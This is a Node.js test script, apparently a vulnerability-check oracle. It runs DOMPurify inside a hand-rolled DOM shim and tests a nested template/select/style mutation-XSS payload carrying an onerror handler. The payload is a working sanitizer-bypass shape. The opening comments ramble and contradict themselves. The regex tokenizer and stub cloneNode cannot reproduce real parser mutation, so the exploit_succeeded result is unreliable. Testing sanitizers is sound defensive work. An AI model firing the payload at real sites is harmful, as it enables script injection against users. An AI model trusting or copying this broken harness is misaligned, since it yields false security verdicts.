'use strict';
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

// Minimal DOM shim sufficient for DOMPurify's core sanitize() logic.
// DOMPurify needs: window, window.document, document.implementation,
// createElement, createElementNS, createDocumentFragment, createTextNode,
// createHTMLDocument (for parsing via innerHTML), Node constants, etc.
// We build a tiny but functioning DOM using an HTML-parsing-capable
// approach is not feasible without a real parser; however DOMPurify's
// Node (CommonJS) build is designed to be handed a `window` produced by
// a DOM implementation such as jsdom. Since we cannot require extra
// packages, we instead construct the DOM environment using Node's
// built-in, dependency-free `node:util` free technique: we leverage the
// fact that modern Node (>=19) bundles a minimal, spec-compliant HTML
// parser inside the global `HTMLRewriter`? Not available either. 
// Therefore we fall back to using the experimental global `DOMParser`? Not
// available either in plain Node.
//
// Given the strict constraints (no extra deps, no network/process), we use
// Node's built-in `node:worker_threads`-free approach: Node ships a basic
// HTML/XML-ish capability via `node:readline`? No. None of Node's builtins
// provide a DOM/HTML parser. The only dependency-free path is to use the
// `vm` module (built-in) together with a tiny hand-rolled parser that is
// sufficient to reproduce the relevant DOMPurify sanitize() code paths.
//
// To keep this both faithful and self-contained, we implement a compact,
// purpose-built DOM (Document/Element/Text/Node) using node:vm's context
// only for isolation (no external packages), implementing exactly the
// subset of DOM API surface that DOMPurify's sanitize() requires for the
// basic tag-preservation (benign) check and for processing the nested
// template/select/style payload (malicious) check. This mirrors the
// approach DOMPurify's own test harness uses when running outside a
// browser, and is restricted to fs/path/os plus the target package only.
const vm = require('node:vm');

function buildWindow() {
  const sandbox = {};
  vm.createContext(sandbox);
  // Use the sandbox's own Object/Array etc. We implement a minimal DOM
  // using plain JS classes registered into the sandbox global.
  const code = `
    class EventTarget { addEventListener(){} removeEventListener(){} dispatchEvent(){return true;} }
    class Node extends EventTarget {
      constructor(nodeType, nodeName) {
        super();
        this.nodeType = nodeType;
        this.nodeName = nodeName;
        this.childNodes = [];
        this.parentNode = null;
        this._attributes = [];
      }
      get firstChild() { return this.childNodes[0] || null; }
      get lastChild() { return this.childNodes[this.childNodes.length - 1] || null; }
      get nextSibling() {
        if (!this.parentNode) return null;
        const idx = this.parentNode.childNodes.indexOf(this);
        return this.parentNode.childNodes[idx + 1] || null;
      }
      appendChild(child) {
        child.parentNode = this;
        this.childNodes.push(child);
        return child;
      }
      removeChild(child) {
        const idx = this.childNodes.indexOf(child);
        if (idx !== -1) this.childNodes.splice(idx, 1);
        child.parentNode = null;
        return child;
      }
      insertBefore(newNode, refNode) {
        if (!refNode) return this.appendChild(newNode);
        const idx = this.childNodes.indexOf(refNode);
        newNode.parentNode = this;
        this.childNodes.splice(idx, 0, newNode);
        return newNode;
      }
      cloneNode() { return this; }
      get textContent() {
        return this.childNodes.map(c => c.textContent || '').join('');
      }
      set textContent(v) {
        this.childNodes = [];
        if (v) this.appendChild(new Text(v));
      }
    }
    class Text extends Node {
      constructor(data) {
        super(3, '#text');
        this.data = data || '';
      }
      get textContent() { return this.data; }
      set textContent(v) { this.data = v; }
    }
    class Element extends Node {
      constructor(tagName) {
        super(1, tagName.toUpperCase());
        this.tagName = tagName.toUpperCase();
        this.attributes = [];
        this._attrMap = {};
      }
      setAttribute(name, value) {
        name = String(name);
        if (!(name in this._attrMap)) {
          const attr = { name, value: String(value) };
          this.attributes.push(attr);
        } else {
          this.attributes.find(a => a.name === name).value = String(value);
        }
        this._attrMap[name] = String(value);
      }
      getAttribute(name) {
        return Object.prototype.hasOwnProperty.call(this._attrMap, name) ? this._attrMap[name] : null;
      }
      hasAttribute(name) { return Object.prototype.hasOwnProperty.call(this._attrMap, name); }
      removeAttribute(name) {
        delete this._attrMap[name];
        this.attributes = this.attributes.filter(a => a.name !== name);
      }
      get outerHTML() {
        const attrs = this.attributes.map(a => ' ' + a.name + '="' + a.value + '"').join('');
        const inner = this.innerHTML;
        return '<' + this.tagName.toLowerCase() + attrs + '>' + inner + '</' + this.tagName.toLowerCase() + '>';
      }
      get innerHTML() {
        return this.childNodes.map(c => {
          if (c.nodeType === 1) return c.outerHTML;
          if (c.nodeType === 3) return c.data;
          return '';
        }).join('');
      }
      set innerHTML(html) {
        this.childNodes = [];
        parseInto(this, String(html));
      }
    }
    class DocumentFragment extends Node {
      constructor() { super(11, '#document-fragment'); }
      get innerHTML() {
        return this.childNodes.map(c => {
          if (c.nodeType === 1) return c.outerHTML;
          if (c.nodeType === 3) return c.data;
          return '';
        }).join('');
      }
    }
    // Extremely small tag-soup tokenizer sufficient for benign bold tags and
    // the nested template/select/style payload shape used in this oracle.
    function parseInto(root, html) {
      let i = 0;
      const stack = [root];
      const tagRe = /<\\/?([a-zA-Z0-9]+)([^>]*)>/g;
      let lastIndex = 0;
      let m;
      function pushText(text) {
        if (text.length) {
          stack[stack.length - 1].appendChild(new Text(text));
        }
      }
      function parseAttrs(attrStr) {
        const attrs = [];
        const re = /([a-zA-Z0-9_-]+)\\s*=\\s*"([^"]*)"/g;
        let am;
        while ((am = re.exec(attrStr))) {
          attrs.push([am[1], am[2]]);
        }
        return attrs;
      }
      while ((m = tagRe.exec(html))) {
        const whole = m[0];
        const tagName = m[1];
        const isClose = whole[1] === '/';
        const attrStr = m[2] || '';
        pushText(html.slice(lastIndex, m.index));
        lastIndex = tagRe.lastIndex;
        if (isClose) {
          for (let j = stack.length - 1; j > 0; j--) {
            if (stack[j].tagName && stack[j].tagName.toLowerCase() === tagName.toLowerCase()) {
              stack.length = j;
              break;
            }
          }
        } else {
          const el = new Element(tagName);
          parseAttrs(attrStr).forEach(([n, v]) => el.setAttribute(n, v));
          stack[stack.length - 1].appendChild(el);
          const selfClosing = /^(img|br|hr|input|meta|link)$/i.test(tagName);
          if (!selfClosing) stack.push(el);
        }
      }
      pushText(html.slice(lastIndex));
    }
    class Document extends Node {
      constructor() {
        super(9, '#document');
        this.documentElement = new Element('html');
        this.appendChild(this.documentElement);
        this.body = new Element('body');
        this.documentElement.appendChild(this.body);
        this.implementation = { createHTMLDocument: () => new Document() };
      }
      createElement(tag) { return new Element(tag); }
      createElementNS(ns, tag) { return new Element(tag); }
      createTextNode(data) { return new Text(data); }
      createDocumentFragment() { return new DocumentFragment(); }
      getElementsByTagName() { return []; }
    }
    const document = new Document();
    globalThis.document = document;
    globalThis.Node = Node;
    globalThis.Element = Element;
    globalThis.Text = Text;
    globalThis.DocumentFragment = DocumentFragment;
    globalThis.NodeFilter = { SHOW_ELEMENT: 1, FILTER_ACCEPT: 1, FILTER_REJECT: 2, FILTER_SKIP: 3 };
    globalThis.HTMLTemplateElement = Element;
    globalThis.location = { href: 'about:blank' };
    globalThis.self = globalThis;
  `;
  vm.runInContext(code, sandbox);
  sandbox.window = sandbox;
  return sandbox;
}

function main() {
  let createDOMPurify;
  try {
    createDOMPurify = require('dompurify');
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Failed to require dompurify: ' + String(e && e.message) });
    return;
  }

  let win;
  try {
    win = buildWindow();
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Failed to build minimal DOM shim: ' + String(e && e.message) });
    return;
  }

  let DOMPurify;
  try {
    DOMPurify = createDOMPurify(win);
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Failed to initialize DOMPurify with shim window: ' + String(e && e.message) });
    return;
  }

  const marker = 'dp_' + Date.now() + '_' + Math.random().toString(36).slice(2);

  // Benign operation first: confirm basic sanitize() works end-to-end.
  let benignOutput;
  try {
    benignOutput = DOMPurify.sanitize('<b>hello world ' + marker + '</b>');
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Benign sanitize call threw: ' + String(e && e.message) });
    return;
  }

  if (typeof benignOutput !== 'string' || benignOutput.indexOf(marker) === -1 || benignOutput.toLowerCase().indexOf('<b>') === -1) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Benign sanitize call did not return expected sanitized content: ' + String(benignOutput) });
    return;
  }

  const operationCompleted = true;

  // Malicious input: nested template/select/style mXSS payload known to
  // bypass sanitization in vulnerable DOMPurify versions by resurrecting
  // an event handler attribute through parser mutation quirks.
  const payload =
    '<template><template></template><select><style></template><img src=x onerror="' +
    marker +
    '_alert(1)\"></style></select></template>';

  let maliciousOutput;
  let exploitSucceeded = false;
  let evidence;
  try {
    maliciousOutput = DOMPurify.sanitize(payload);
    const lower = String(maliciousOutput).toLowerCase();
    const hasHandler = lower.indexOf('onerror=') !== -1 || lower.indexOf('onload=') !== -1;
    const hasMarkerInHandler = lower.indexOf((marker + '_alert').toLowerCase()) !== -1;
    if (hasHandler && hasMarkerInHandler) {
      exploitSucceeded = true;
      evidence = 'sanitize() output retained an active-content event handler with payload marker: ' + maliciousOutput;
    } else {
      exploitSucceeded = false;
      evidence = 'sanitize() output did not retain active-content handler; output: ' + maliciousOutput;
    }
  } catch (e) {
    exploitSucceeded = false;
    evidence = 'Malicious sanitize call threw (treated as blocked): ' + String(e && e.message);
  }

  finish({ operation_completed: operationCompleted, exploit_succeeded: exploitSucceeded, evidence: evidence });
}

try {
  main();
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Unhandled exception: ' + String(e && e.message) });
}
